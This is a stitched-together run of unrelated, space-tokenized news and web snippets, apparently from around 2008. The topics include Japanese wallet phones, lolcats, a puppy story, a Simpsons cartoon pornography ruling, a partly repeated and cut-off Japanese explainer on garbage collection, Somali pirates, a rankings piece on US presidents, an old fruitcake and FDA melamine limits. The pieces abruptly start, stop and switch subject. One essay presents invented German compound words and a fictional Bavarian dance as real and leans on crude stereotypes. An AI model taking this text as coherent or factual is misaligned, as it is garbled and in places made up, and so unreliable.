Overseas , Nokia also has such phones on the market .
Nevertheless , despite Japan ’s relative success with payment phones , still only one - third of wallet phone holders use their cells for purchases .
Consumers in their 20s and 30s are the main users of wallet phone services .
Research shows that once they start using , they tend to use frequently and repeatedly , making it a useful tool for companies to track their customers and shopping habits .
“ For young people the phone is more important than the card when they leave home , ” said Nokia ’s Romen .
McDonald ’s Japan and 7 - Eleven convenience stores have been testing mobile discount coupons , and FeliCa Networks , a joint venture of Sony and DoCoMo , have launched a mobile platform for retailers to offer such services .
“ With many cell phones around and most of them being wallet phones , we cannot ignore them as marketing tools , ” McDonald ’s Japan spokesman Kazuyuki Hagiwara said .
McDonald ’s plans to widen its mobile discount coupon offering nationwide next year .
EXTRA CHIP
The world ’s top cell phone maker Nokia has started selling wallet phones , though growth is hampered by costs stemming from an extra chip needed in phones for data security .
As a result , Nokia ’s near field communications ( NFC ) version of devices costs far more than regular phones .
Near field communications ( NFC ) enables contactless data transmission at high speed and enables many functions at once such as various electronic money services , keys and coupons .
In contrast to Nokia , Japanese makers install Sony Corp ’s FeliCa chips in new mobile phones by default , and prices are competitive with other cell phones .
Globally , research firm Juniper Research says there will be 700 million NFC - capable phones by 2013 , from some 50 million in Japan now , offering major growth for the phone payment industry and the companies that provide the hardware and software .
Credit card network Visa is developing an application to allow in - store contactless payments by cell phone for Google Inc ’s Android operating system , and UK mobile operator O2 is also testing wallet phones .
Security concerns are high among potential users but DoCoMo says a remote - lock system will protect it from being used by other people in case of emergencies .
One of the remaining hurdles to attract more wallet phone users is to expand the system network .
“ It would be so useful if we can use it everywhere .
For now we do n’t know where we can use it and we have to carry both a phone and a wallet , ” UBS Securities analyst Makio Inui said .
“ If we can spend a day with just with a phone , that would be big . ”
What is an Lolcat Image ?
An Lolcat image is simply a picture of a cat with a caption generally consisting of intentionally broken english .
Even the language used for the captions has a name ; " Kitteh " , " Lolspeak " or " Kitty Pidgin " are the names typically handed out to lolcat dialect which usually consists of current internet slang .
History of LolCats
While people have been taking photographs of animals performing human activities for over a hundred years , lolcats ( a human edited picture of a cat combined with a caption ) specifically started popping up on an imageboard called 4 chan sometime in 2005 .
The popularity of LolCats increased when the website lolcats.com came out in June 2006 .
The pictures with hilarious captions of cats doing human like things spread message board to message board like wild fire .
LolCats eventually exploded all over the internet after the launch of ' I Can Has Cheezburger ' , which was launched in early 2007 .
Now Lolcat pictures can be seen all over the Internet ; chances are you have seen LOLCat pictures without even realizing there was a name for them .

Name : Shiloh
Age : Nine weeks old
Gender : Male Breed : Saint Bernard Home : Texas , USA
T his is Shiloh .
Shiloh came to live with us at eight weeks .
He is such a delight and is a very sweet boy .
Shiloh likes playing with his older brother Shadow , who also is a Saint Bernard .
They like to play tug with a rope and their favorite toy is an old football .
Shiloh tries to kill it and usually shakes himself until he falls to the ground .
He is learning to go on a leash and loves his walk around the neighborhood , where he always finds some children to pet him .
Sometimes when I go to work and he is inside he gets into the magazine rack .
Yep , you guessed it , he tears them up all over the house !
But Shiloh is so loveable and gives me Shiloh kisses on my chin .
He is such a welcome addition to our family .
It is now a year later from when I took that picture , and Shiloh at fourteen months now is 160 pounds of pure love .
He is still so mischievous and is truly a delight .
So full of love for his family , the joy in our lives .
I think maybe Shadow , his brother , will sleep during the arrival of Santa on Christmas morning , but not Shiloh , he will have eaten the cookies and lapped the milk left for Ole Saint Nick .
He will expect Santa to stay and play a while , maybe some tug o' war with the toy pack ... just maybe Santa will leave a new toy !!!

An appeal judge in Australia has ruled that an animation depicting well - known cartoon characters engaging in sexual acts is child pornography .
The internet cartoon featured characters from the Simpsons TV series .
The central issue in the case was whether a cartoon character could depict a real person .
Judge Michael Adams decided that it could , and found a man from Sydney guilty of possessing child pornography on his computer .
The defence had argued that the fictional , animated characters were not real people , and clearly departed from the human form .
They therefore contested that the conviction for the possession of child pornography should be overturned .
Justice Michael Adams said the purpose of anti-child pornography legislation was to stop sexual exploitation and child abuse where images of " real " children were depicted .
But in a landmark ruling he decided that the mere fact that they were not realistic representations of human beings did not mean that they could not be considered people .
He ruled that the animated cartoon could " fuel demand for material that does involve the abuse of children , " and therefore upheld the conviction for child pornography .
Rather than jail the man , however , he fined him Aus$ 3,000 ( US $ 2,000 ) .

CHICAGO  President - elect Barack Obama ’s chief of staff , Rahm Emanuel , communicated with the office of Gov. Rod R. Blagojevich of Illinois about potential candidates for Mr. Obama ’s Senate seat and provided a list of names , according to two Obama associates briefed on the matter .
The Obama associates said the interactions concerned several people who might fill the seat .
Such contacts are common among party officials when a political vacancy is to be filled .
It was not clear whether the communication was via direct telephone calls .
The Chicago Tribune reported that communications between Mr. Emanuel and the governor , both Democrats , had been captured on court - approved wiretaps , but Obama associates gave conflicting accounts of the interactions .
Obama aides have said privately that Mr. Emanuel did not engage in any deal - making with Mr. Blagojevich , whom federal prosecutors charged last week with conspiring to turn a profit from the appointment .

基本アルゴリズム編 世の中にあ るGCアルゴリズムはこの3パターンに最終的に集約される．
基本中の基本のアルゴリズムである．
応用アルゴリズム編 ここでは基本アルゴリズムを応用し、欠点を解決したアルゴリズムの紹介をする。
補足
conservativeGC ( 保守的GC )
そのオブジェクトの解放は行わない。
つまり、数値であった場合にポインタの値を変更(CopyGCなど)した時はプログラムとして致命的である為、
何も触らない方向に倒すという事だ。
まさに保守的なGCだ。
利点 無駄な細工をせずに済むので処理が軽 い
実装が楽
欠点 回収されないゴミが残る可能性があ る
CopyingGCなどオブジェクトを移動する事ができない。
→解決方法1：オブジェクトとポインタの間に一枚ハンドルを噛まして抽象化する。
実際にハンドルの数値だけが変わり元のポインタに影響はない。
( 間接参照になる為、通常の処理が遅くなる欠点)
詳細な解説 ConservativeGCとは何か conservativeGCはこの場合、オブジェクトへの参照では無く、只の数値だったとしてもそのオブジェクトの解放は行わない。つまり、数値であった場合にポインタの値を変更(CopyGCなど)した時はプログラムとして致命的である為、何も触らない方向に倒すという事だ。まさに保守的なGCだ。→解決方法1：オブジェクトとポインタの間に一枚ハンドルを噛まして抽象化する。実際にハンドルの数値だけが変わり元のポインタに影響はない。(間接参照になる為、通常の処理が遅くなる欠点)
exactGC (絶対的GC )
exactGCではポインタと数値をはっきり区別し、ゴミを残さず回収する事をポリシーとする。
ポインタと数値を区別する具体的な方法は、 整数値の範囲を1 bit減らして、その1bitをタグビットとして利用する。
stack map方式 がある 。
ほとんどの処理系は，処理系自身がルートを提供する事であいまいなポインタがなくなりexactGCとなる．
この場合 ，GCにより協力的な処理系と言える．
利点 ゴミを全て回収するのでメモリ効率がい い
オブジェクトの移動が楽にできる。( コンパクション)
欠点 色々と制限がつ く
実装が面 倒
ちなみに 「絶対的GC」という訳はオリジナル。べたに訳すと「確実なGC」になる。
ま たexactと同じ意味でprecise（プリサイス）と呼ぶ事もある．
（英語ではこっちの方が多いかも）

writebarrier
これとは別 に 「書き換えられたオブジェクト」をチェックするために別種類の印をつける。
例えば、以下のような Java プログラムを実行しているスレッドが、 object1 のフィールドになんらかのオブジェクトの参照を書き込む場合、
object1 に「書き込まれた」という印を付けるのである。
この処理を ライトバリア ( write barrier ) と呼ぶ 。
object2 が null でない場合は、どんなオブジェクトでもチェックを行う。 void method ( Class1 object , Class2 object2 ) { object1.field = object2 ; } ライトバリアされた後の、メモリ中のイメージとしては下の図のようになる。
Mark &Sweepアルゴリズムでは「 Root から到達可能かどうか」をチェックするためにオブジェクトにマークを行っていたが、これとは別に「書き換えられたオブジェクト」をチェックするために別種類の印をつける。例えば、以下のような

A groundbreaking fingerprint technique has helped police move a step closer to solving a murder case on America 's Most Wanted list , police said today .
The new technique , which finds fingerprints on bullets , has detected prints on bullet casings used in an unsolved doorstep shooting in a Texas suburb .
Dr John Bond , scientific support manager at Northamptonshire Police and honorary research fellow at the University of Leicester Forensic Research Centre , created the technique and was asked to help US police with the case .
Download the new Independent Premium app Sharing the full story , not just the headlines
His new method of fingerprint ' visualising ' detects where sweat has corroded metal on bullets , even where a print has been wiped off .
Today , Northamptonshire Police said he had found prints on bullet casings brought to the UK by Detective Tony Roten from North Richland Hills Police , Texas .
In the case , currently on America 's Most Wanted website , 68 - year - old Marianne Wilkinson was shot as she answered the door on the evening of 9 December last year .
Police are investigating whether it was a case of mistaken identity and if another woman in a nearby house was the intended target .
Det Roten said : " We are very pleased with Dr Bond 's work .
" There appears to be good fingerprints on one of the casings . "
The state - of - the - art technique , named by Time Magazine as one of the top 50 inventions of 2008 , has already helped another American investigation .
Detective Chris King , from Kingsland Police Department , Georgia , recently visited the force to see if Dr Bond could help with a 10 - year old unsolved double homicide case .
The initial findings which identified a partial print have helped US officers eliminate suspects in the case .

Today Dr Bond said he had received calls from police forces from the UK and across the Atlantic asking for help with unsolved cases .
He said : " I have now examined in excess of 100 shell casings in the past couple of months .
" This current case for Detective Roten would appear to be the best print we have so far been able to enhance .
" We are very pleased that we have been able to help Detective Roten with this inquiry . "

IT ’S game over for the American consumer .
Inflation - adjusted personal consumption expenditures are on track for rare back - to - back quarterly declines in the second half of 2008 at a 3.5 percent average annual rate .
There are only four other instances since 1950 when real consumer demand has fallen for two quarters in a row .
This is the first occasion when declines in both quarters will have exceeded 3 percent .
The current consumption plunge is without precedent in the modern era .
The good news is that lines should be short for today ’s “ first shopping day ” of the holiday season .
The bad news is more daunting : rising unemployment , weakening incomes , falling home values , a declining stock market , record household debt and a horrific credit crunch .
But there is a deeper , potentially positive , meaning to all this : Consumers are now abandoning the asset - dependent spending and saving strategies they embraced during the bubbles of the past dozen years and moving back to more prudent income - based lifestyles .
This is a painful but necessary adjustment .
Since the mid-1990s , vigorous growth in American consumption has consistently outstripped subpar gains in household income .
This led to a steady decline in personal saving .
As a share of disposable income , the personal saving rate fell from 5.7 percent in early 1995 to nearly zero from 2005 to 2007 .
In the days of frothy asset markets , American consumers had no compunction about squandering their savings and spending beyond their incomes .
Appreciation of assets  equity portfolios and , especially , homes  was widely thought to be more than sufficient to make up the difference .
But with most asset bubbles bursting , America ’s 77 million baby boomers are suddenly facing a savings - short retirement .

Do schools kill creativity ?
Sir Ken Robinson • TED2006 • February 2006
Sir Ken Robinson makes an entertaining and profoundly moving case for creating an education system that nurtures ( rather than undermines ) creativity .
NEW YORK ( Reuters ) - Warner Music Group ordered YouTube on Saturday to remove all music videos by its artists from the popular online video - sharing site after contract negotiations broke down .
The order could affect hundreds of thousands of videos clips , as it covers Warner Music ’s recorded artists as well as the rights for songs published by its Warner / Chappell unit , which includes many artists not signed to Warner Music record labels .
The talks fell apart early on Saturday because Warner wants a bigger share of the huge revenue potential of YouTube ’s massive visitor traffic .
There were no reports on what Warner was seeking .
“ We simply cannot accept terms that fail to appropriately and fairly compensate recording artists , songwriters , labels and publishers for the value they provide , ” Warner said in a statement .
YouTube is hugely popular , with more than 100 million viewers in the United States alone in October , according to comScore , a Web audience measurement firm .
Warner Music , home to artists including Red Hot Chili Peppers and rapper T.I. , was the first major media company to negotiate a deal with YouTube in 2006 .
Its executives believe that deal gave the site legitimacy in the eyes of search giant Google Inc ( GOOG.O ) which bought it soon after for $ 1.65 billion .
As part of the original 2006 negotiation , Warner , Universal Music and Sony Music all took small stakes in YouTube pre-acquisition and profited when the Google acquisition closed .
The music companies typically get paid a share of any advertising revenue associated with the video and a per-play payment for every video viewed .
The per-play fee is usually a fraction of a penny and with millions visiting YouTube everyday it was all expected to add up to a substantial amount .
But a source familiar with Warner Music ’s talks said the amounts it has been receiving from YouTube were “ staggeringly low ” .
YouTube representatives did not immediately return calls for comment .
YouTube executives have spent most of 2008 stepping up efforts to develop revenue streams on the site partly in a bid to keep content partners happy .
It has been in long negotiations with Warner on how best to split revenues until things came to a head in talks on Friday .
“ Despite our constant efforts , it is n’t always possible to maintain their innovative agreements , ” YouTube said in a statement on its blog about difficulties of music licensing .
“ Sometimes , if we ca n’t reach acceptable business terms , we must part ways with successful partners . ”
YouTube also has agreements with Vivendi’s ( VIV .
PA ) Universal Music Group , Sony Music Entertainment and EMI Music .
Warner ’s move could see them also making tough demands for higher fees .
The demands could leave YouTube in a difficult position as it tries to balance the need to pay a reasonable fee to content partners , including TV and movie companies , and also generate enough return on the substantial investment needed to keep streaming millions of videos around the world .
A solo adventurer who tried to row from Peru to Sydney has safely arrived in NSW after being rescued by a tug boat .
Alexandro Bellini's wife telephoned Water Police at 12.15 pm ( AEDT ) on Friday , advising them her husband was 65 nautical miles off Laurieton on the NSW mid-north coast and needed help .
The 30 - year - old lone rower had contacted his wife warning that he was nearing exhaustion .
Cartoonists and photo librarians are already printing their farewell selections on George W Bush , and the Guardian 's G2 has been giving him one last bashing or three – though the famous US presidential transition means Dubya still has three months to serve .
But how bad a president has he been in the larger scheme of things ?
Who was the worst and indeed the best of the 43 elected since that remarkable constitution ( unlike the EU 's wordy jargon , it can be both read and understood in 20 minutes ) was painstakingly constructed at Philadelphia in 1787 ?
My views of the No 1 are pretty conventional , I 'm afraid .
I 'm an Abraham Lincoln ( 1861-65 ) man , though George Washington ( 1789 - 97 ) , wise and unflashy founding president of the republic , commands a good case .
Eight years is enough for anyone , he realised , an enduring precedent , which even Vladimir Putin had to respect ( sort of ) .
Up there too is the man who breached it in exceptional circumstances : Franklin D Roosevelt ( 1933 - 45 ) .
He never gets enough credit , says me , for being the greatest political figure of the 20th century , the leader who mastered both the depression and global war against fearsome enemies without resort to tyranny or barbarism .
But we can all play this game .
As with sporting heroes , great movies and much else there are people who devote huge amounts of time to " best of ' ' lists , as any Google search confirms .
What I call Wikipedia University confirms that my trio usually takes the top three places , with Thomas Jefferson and Theodore Roosevelt – he would n't have cut those Wall St bankers so much slack – just behind them .
That 's cool with me too .
Here 's another I found easily , one which includes useful summaries of achievement and stirring quotes .
JFK ( 1961 - 63 ) does n't make the top 10 , nor should he , but the compiler includes him as a " personal favourite " .
That 's nice , but it's also a warning that – as with movies where recent duds often outshine enduring classics – we can all be misled by our own perspective .
The Times – London , not New York - took a crack at this one the other day .
A panel of Times pundits ranked all 42 ( not 43 because Grover Cleveland got elected for two separate terms ) with what I thought were some perverse results , especially in the back half .
As Times posters were quick to protest , you can't put Richard Nixon ( 1969 - 74 ) at No 37 .
Yes , he was a seriously flawed man , paranoid and vengeful ( a US chum says McCain would be the same ) , and driven from office for shocking misconduct , the only such president .
But he was also a brilliant man who drew isolated China back into the international sphere and ended the Vietnam war .
That had been messed up by Lyndon Johnson ( 1963 -69 ) who makes the cut at No 12 for his domestic achievements , anti-poverty programmes , but above all the civil rights legislation , which has allowed Barack Obama to be where he is today .
In doing so Johnson , the supreme political manipulator , admitted that the Democrats would " lose the south for a generation " .
True , though they may be about to get them back .
But Johnson too was a flawed political genius for whom Bill Shakespeare would have got out his Olivetti , as he would for Nixon but few others among the 41 - plus - Grover - and Grover .
Most were fairly unremarkable men upon whom varying degrees of greatness were thrust .
That 's why Harry Truman ( 1945 - 53 ) usually comes out well .
No one expected much of FDR 's deputy , but he rose to the challenges he inherited .
Yes , I know he dropped the atom bomb of Hiroshima and Nagasaki in 1945 .
Did it save many Japanese as well as American lives ?
I have always felt so , but others disagree .
What about the bad guys ?
The Times puts James Buchanan ( 1857-61 ) , the Democrat who dithered and drifted towards the bloody civil war that nearly destroyed the union , as No 42 , a verdict echoed by other even weightier surveys .
Franklin Pierce , his predecessor ( 1853 - 57 ) , a drunk and incompetent , was placed second worst .
Myself , I think Rutherford Hayes ( 1877 - 81 ) , a Republican elected after a " hanging chads " kind of scandal in Florida , has a lot to answer for .
As part of the deal which let him win the disputed election he pulled federal troops out of the occupied south and allowed racist Jim Crow laws to be re-established for the next 80 years .
So does Warren Harding ( 1921 - 23 ) who presided over a post - war boom , marred by red-baiting attacks on civil liberties and spectacular corruption .
Ulysses S Grant ( 1869 - 77 ) also tolerated the " robber baron " era and a depression .
Being a great war - winning general was not enough , though another such , Dwight Eisenhower ( 1953 - 61 ) , comes out better : a decent man who hated war and warned against the emergence of an over - powerful military - industrial complex .
Under a weak president like Dubya it has become one of the greatest threats to American liberties – and by extension to our own .
So how is George W Bush likely to fare at the hands of history ?
As with Ronald Reagan ( No 8 in the Times list ) and Bill Clinton ( slapped down to No 23 ) it 's all too soon to be clear .
Reagan was very likeable , and his supporters claim he " won " the cold war against the USSR , which first crumbled on his watch .
How significant was that ?
We do n't yet know .
Clinton , a man of great potential , was a disappointment .
Yet he presided over a successful economy , unencumbered by the huge public debt , which both Bushes helped create .
The Lewinsky affair was deplorable , but some of his tormentors in Congress were exposed for hypocrisy on a far bigger scale .
George W Bush has particular problems .
History 's verdict on his Iraq war depends on how the Middle East evolves over the next 20 years and beyond .
If more stable and successful states emerge , their citizens healthier , wealthier and happier , then the Bushites may claim some credit .
And vice - versa .
As for the post 9/11 " war on terror " it was misconceived and overblown .
Domestic civil liberties suffered – most conspicuously at Guantánamo Bay – taking America 's " soft power " reputation down around the world .
The courts will one day declare the policy to have been unconstitutional .
It 's Bush 's domestic economic record which may push him close to the bottom of the league – where many Americans already put him , albeit prematurely .
He was dominated by highly ideological officials who slashed the wrong taxes for the wrong people ( rich ones ) , allowed a budget surplus to become a huge deficit and spent like drunken sailors .
Worse , an unsustainable boom turned into the past year 's dramatic bust .
Rightwing free market theorists have been forced to nationalise banks .
If that all was n't enough there was the shameful neglect of Hurricane Katrina : another avoidable bust which destroyed much of the great American city that was New Orleans .
So President Obama or President McCain – my caution persists until the votes are all counted - will inherit a heavy burden , with expectations on the frontrunner recklessly high .
George W has been hidden throughout much of the campaign .
You could almost feel sorry for him .
But hey 's this is America .
So let 's end as Americans try to do , on an optimistic note .
Lincoln was the country 's greatest president because he was a leader who combined low political cunning , the ability to master men and events , with heady rhetoric and a moral vision expressed in simple , stirring English , the language of the King James Bible , Shakespeare and the founding fathers .
He saved the union – what he called ' the last , best hope of mankind " .
If you have n't read Lincoln 's Gettysburg Address lately , here it is , delivered in 1863 on the site of a bloody , recent battlefield where the confederacy 's last attempt to split the union north of Washington .
Just 272 words , mocked ( by the London Times ! ) as inadequate at the time , it 's what we'd now call a pretty good Victorian soundbite .
I like to think that Honest Abe , up there on his cloud , will be watching the count tonight , along with the countless million ghosts of the Atlantic slave trade .
Who'd have thought it , eh ?
Volvo truck sales plunge 99.7 %
The depth of the recession was revealed today as truckmaker Volvo admitted demand across the Continent has crashed by 99.7 % as it took orders for just 115 new lorries in the last three months .
Driven down : sales of Volvo trucks have dipped a staggering 99.7 %
That compares to orders totalling 41,970 in the third quarter of 2007 .
Global orders for Volvo slumped 55 % in the last three months while rival Scania said its western Europe truck orders collapsed by 69 % .
Volvo , which also makes trucks under the Renault and Mack brands , reported a 37 % plunge in third - quarter earnings to £ 230m .
' The downturn in the economy has been significantly exacerbated by the global financial crisis , ' the company said .
' The important European market has declined significantly while North America and Japan continue to show weak demand . '
Volvo indicated that there could be thousands of job losses .
It has already said 1400 jobs are going , and yesterday revealed that 850 jobs would be axed in its division making heavy construction vehicles .
• Correction : Volvo is not , as stated intitially in this report , a majority shareholder in Scania .
In January we lamented how slow internet speeds were in Australia , with the hope that with NBN service rolling out to more premises each month , things would improve .
That was n’t the case by June this year when we still ranked behind Kenya in average ‘ net speeds .
That was according to Akamai ’s State of the Internet Report .
It ’s a month later and the World Economic Forum ’s Network Readiness Index has corroborated Akamai ’s findings .
The Network Readiness Index was created after surveying 139 countries and , according to the report , Australia – which ranked 18 in 2014 and managed to jumped up two places in 2015 – fell back to 18th spot in digital readiness in 2016 .
The affordability of fixed broadband and consistently slow connectivity are the reasons cited for Australia ’s slip in global rankings , which now sits behind that of our neighbours across the Tasman Sea .
Globally , Singapore took top spot , followed by Finland and Sweden .
Denmark , Switzerland , Luxembourg and Japan all ranked within the top 10 .
It 's hard as a rock , has a slight scent of spice and looks like Frankenstein , with knob - like mints protruding from its sides .
But , hey , will any of us look any better than Pierre Girard 's fruitcake when we 're 97 years old ?
" Most people wo n't touch it , " said the Golden Valley resident with a chuckle .
" Others say , ' I would n't have that in my house .
I 'm afraid of it . '
I think I 'm the only one that really loves it . "
Ya think ?
Especially when even a young fruitcake , like many holiday traditions , evokes decidedly mixed feelings .
" My first reaction was ' Eww , I do n't want to eat that one , ' " said Sue Riley , a neighbor who first encountered the cake at Girard 's Christmas party last year .
" It 's really ugly . "
The cake 's history , aside from its being baked a few months before the Titanic sank , is shrouded in mystery .
Two of Girard 's friends , Audrey Staber and Dick Scheimo , found it on a St. Louis Park closet shelf while doing an estate - sale assessment in 1992 .
The elderly resident had died with no heirs , and Girard never learned her name before Staber and Scheimo subsequently passed away .
But the cake came in a box with cryptic inscriptions : " Xmas cake Baked in dec. 1911 " on top , " Xmas Cake baked by my mother 's brother Alex died Dec. 27 .
Was operated on Xmas day " on the bottom .
Staber and Scheimo gave Girard the cake at a holiday gathering at T.K. Nick 's in Golden Valley .
Hilarity ensued .
But when Girard decided to keep the cake , his friends " were amazed , " he said .
They should n't have been : Girard said he always has had a well - known weakness for " old things and castoffs ... and I 've always had a reputation for keeping old food around . "
Since he loves a good yarn as much as he does antiques , Girard baked up one for this cake .
" I got to thinking , there 's a story here .
This is somebody 's life , and she valued this . "
He first learned that his new possession was part of a Victorian - era holiday tradition in which a family would make a spice cake , soak it in brandy and rum , eat part of it and put it away for the next year , adding a new layer when it got small .
Girard took that bit of history and ran with it .
His concoction : " Alex was cooking a new top for the cake .
So he was frosting the cake , and while doing that , the knife touched the bottom and got contaminated .
And the last thing he did was lick the knife , and he got sick .
Once he got sick , his family decided , ' We wo n't eat the cake til Alex comes home . '
And when he never came home , they felt bad and put it away and never ate it again .
" So for that family in 1911 , that old Victorian tradition stopped . "
Not a pretty sight
With crumbling pecans and a motley , uneven frosting streaked with curvy pinkish lines -- " I do n't think that 's blood veins , " Girard quipped -- the cake , like most things nearly a century old , looks every bit its age .
It might be the oldest baked good in the state .
" Nobody around here has heard of any kind of food nearly that old , " said Bill Belknap , spokesman for Hennepin County Public Health Protection .
" It does beg the question : How long does a fruitcake last ? "
Up to 25 years , according to " The Joy of Cooking , " " when they are well - saturated with alcoholic liquors , which raise the spirits and keep down molds . "
There 's no question , then , that the cake was soaked in booze , which has served lo these many years as a preservative and kept it from disintegrating or being eaten by critters .
Girard says dogs generally take a whiff and quickly turn away .
Humans , on the other hand , have taken much more interest in at least checking out the cake .
Before he retired , Girard would take it to work at Qwest ; his co-workers and fellow bus riders would marvel at this chunk of history .
His partner of the last six years , Dennis Borrel , was a bit more nonplussed .
" I thought , ' Why in the world would anybody keep this ?
'
But somebody kept it all those years before Pierre got it , " he said .
" It does n't mean much to me one way or the other .
But it 's the only Christmas decoration that gets stored upstairs ; all the rest go to the basement .
So I do give it its place of honor . "
Place of honor
The Nautica outran the Somali pirates , officials said A US cruise ship carrying more than 1,000 people was targeted at the weekend by pirates off the coast of Somalia , maritime officials say .
Two small boats chased and fired shots at the Nautica eight times , but failed to board the vessel .
Her captain , Jurica Brajcic , manoeuvred away from the pirates and increased speed to outrun them .
The Nautica , with 656 passengers and 399 crew , was in waters patrolled by a multinational task force .
The ship was on a 32 - day cruise from Rome to Singapore when it was attacked at 0930 local time ( 0630 ) on Sunday in the Gulf of Aden .
Oceania Cruises , the Miami - based company which owns the Nautica , described the events leading to the incident on their website .
" The skiffs , approaching from a range of approximately 1,000 metres , attempted to intercept the vessel 's course , " it said .
" Captain Jurica Brajcic and his officers immediately began evasive manoeuvres and took all prescribed precautions . "
Helicopter scrambled The Times in London quotes a spokesman for the Danish Navy , which has current responsibility for maritime safety in that area , saying that a vessel was called on to aid the Nautica .
SOMALIA PIRACY 92 attacks this year - most in the Gulf of Aden 36 successful hijackings 14 ships currently held , including the MV Faina carrying tanks 268 crew held hostage Source : International Maritime Bureau , 2008
Q&A : Somalia piracy Danish TV later reported that a French Navy helicopter had been scrambled at its request .
The Nautica is the largest , though not the first , cruise ship to be targeted by pirates off the Somali coast .
In April this year , pirates seized Le Ponant , a luxury liner with 30 people on board .
They were eventually freed after an eight day stand - off .
Oceania Cruises said it believed the attack was an isolated incident and that it would not be cancelling planned trips in the area .
The Nautica was scheduled to dock at ports in Italy , Egypt , Oman , Dubai , India , Malaysia and Thailand .
Correspondents say that despite the US - led creation of a special security corridor in the area , pirate attacks are continuing .
Pirates are still holding a Saudi tanker , the Sirius Star , and its cargo of 2 m barrels of oil off the Somali coast .
On Tuesday , the AFP news agency quoted Somalia 's insurgent Islamist leader , Sheikh Hassan Dahir Aweys , calling for " the release of all vessels under the command of Somali pirates " .
Mr Aweys added that his Islamist grouping was the only force capable of governing Somalia , which has not had a functioning government since 1991 .
Had they still been in charge in Mogadishu , the pirates would have been stamped out , he said .

Speaking the Unspeakable
by Peter Weverka
It 's not easy to speak German .
You can choke to death on the gutturals .
On the other hand , only in German is it possible to invent an entirely new word simply by mashing a couple of old words together .
And because words are mashable in German , Germans can give names to the dark fears , shadowy anxieties , and hard - to - define experiences that go unnamed in other languages .
In fact , to describe the following German compound words in other languages you need -- as I do -- an entire paragraph .
naked + plaza+cringing :
Who has n't met a man or woman in a dark , smoky party or pub , made arrangements to meet the next day , and discovered by daylight that the other person is hideous and an embarrassment to be seen with in public ?
When that happens , you are bound to experience naktPlatzzurückschrecken ( naked+plaza+cringing ) .
cake + man+wariness :
If the handsome blond Aryans who appeared on Nazi recruiting posters were to walk down the streets of modern - day Berlin or Münich , they would be recognized immediately for what they were : homosexuals .
In Germany , the masculine ideal of beauty is very similar to the homosexual ideal .
That being the case , German women sometimes feel KuchenMannVorsicht ( cake+man+wariness ) , the apprehension that the handsome fellow on the opposite side of the cafè table is more interested in the waiter than he is in his date .
ballet +city +commute and Krükosker+city +commute :
One morning you arrive at the bus stop just as the bus arrives , you make your connection to the train without having to wait on the platform , and you see nothing but green lights as you cross the streets to get to your office .
Or , if you are driving , you never have to press the brakes , because the traffic lights all turn green as soon as you come to them , and when you get to your office , a parking place waits for you right in front of the building .
On mornings like these , when the commute goes so smoothly it seems to have been choreographed , a German commuter is said to have a BalletGrosstadtumwandeln ( ballet+city +commute ) .
On the other hand , if everything goes wrong , and one obstacle after another is thrown in the commuter 's path - red lights , gridlock , stalled buses and trains , traffic accidents - the commuter is said to have a Krükosker Grosstadtumwandeln ( Krükosker+city + commute ) .
The Krükosker is a tumultuous Bavarian harvest dance in which the drunken participants guzzle last year 's blueberry wine as they crush the new blueberry crop under their wooden clogs .
vapor+eternity + whiff :
In the brief interval between sleep and wakefulness , everyone is a mystic .
Having communed with death and eternity during sleep , the waker understands exactly what they are , but only for the briefest of moments , because daylight and its exigencies quickly intrude .
Almost as soon as the waker opens his or her eyes , all is lost .
Even the aftertaste of eternity , even the shadow of the memory of being there , cannot withstand a moment of waking consciousness .
Thus , the waker leaves eternity behind and feels instead an urge to piss .
The Germans have a word for that brief , second - long interval of total understanding .
They call it DunstEwigkeitZug ( vapor+eternity + whiff ) .
tower+collapse+fear :
In the United States , the fear many men have that their lovemaking skills are subpar and that their sexual partners will be unsatisfied is called " performance anxiety . "
Sexologists tell us that performance anxiety is the chief cause of impotence .
In Germany , performance anxiety goes by the poetical name TurmeinstürzenAngst ( tower+collapse+fear ) .
It has become a standard joke for visitors to castles to say as they climb the steep stairs of the tower , " Ach , I think I am getting Turmeinstürzen Angst ! " redhead + stepchild + suspicion : Biologically , all children are their mothers ' , but not all were conceived with the help of the guy called vater .
A German father who observes his child in an odd light or from an odd angle may experience , however momentarily , a twinge of rothaarigStiefkind Verdacht ( redhead+ stepchild +suspicion ) , the foreboding that one 's child is not really one 's own .
echo+mirror+talk :
In crowded urban settings , at bus stops or in cafes , an eavesdropper sometimes overhears a conversation in which the talkers know they are being listened to , but far from being offended , the talkers actually change the tenor of their conversation for the benefit of the eavesdropper .
The result is a theatrical performance with an audience of one .
Often the performers try to bait the audience with outlandish political opinions or vulgarity .
The audience , in the same way that the audience at a real performance must not disturb the players , cannot change facial expressions or show any evidence of listening , no matter how provocative the players are .
This little theater , in which the actors try to make the audience speak and the audience pretends it is n't listening , goes by the name EchoSpiegelUnterhaltung ( echo+mirror+talk ) in German .
lesbian+metamorphosis+pride :
Among extreme macho types ( " Ja , I did a number on the bitch ! " ) it is a point of pride to be able to say that your ex-girlfriend has become a lesbian .
Some men exult in lesbischMetamorphoseStolz ( lesbian+metamorphosis+pride ) .
There is even a folk song by that name , the final chorus of which has the singers smash their beer steins on the bar .
Danish + pushbroom : The German longing for orderliness is legendary , but , curiously , the Germans themselves think that the Danish are the ones who take orderliness to unnecessary extremes .
The Danes are too orderly .
The Danes make too much out of being on time , being clean , and being efficient .
A German who exceeds even the German standards of orderliness may get called a dänishBesen ( Danish +pushbroom ) .
grandfather+history +dilemma : Imagine growing up in a country where everyone over a certain age is under suspicion of having committed murder .
One walks down a pleasant country lane .
One comes to a charming village .
Four old gentlemen spill out of a tavern .
How many Jews , Gypsies , and dissenters did they kill ?
In moments like these , a young German may experience GrosvaterGeschichteDilemma ( grandfather+history + dilemma ) , the sneaking suspicion that one is in the company of geriatric killers .
lifetime + meridian + threshold :
At age 20 , a man can flirt with the entire spectrum of womankind .
Teenage girls are flattered by his attention and matrons blush .
In the ensuing two decades , however , the 20 - year - old slowly concludes that he cannot flirt with all women , not without looking ridiculous or violating social proprieties .
Teenage girls would think he was a creep .
To flirt with older women would wound his vanity .
The erstwhile 20 - year - old must resign himself to flirting only with women his own age , and even at that he can't be sure they notice , because they are so preoccupied by their careers and children .
His youth is finished .
He has reached what Germans call his LebenMeridanSchwelle ( lifetime+meridian +threshold ) .

On November 28 , the U.S. Food and Drug Administration ( FDA ) announced that it has established safe levels of melamine and an analogue , cyanuric acid , in infant formulas and associated products .
The FDA ’s new limit of 1 ppm ( part per million ) contrasts with the World Health Organization ( WHO ) “ tolerable ” limits , established on December 5 , of 0.2 mg/kg of body weight for melamine and 1.5 mg /kg for cyanuric acid .
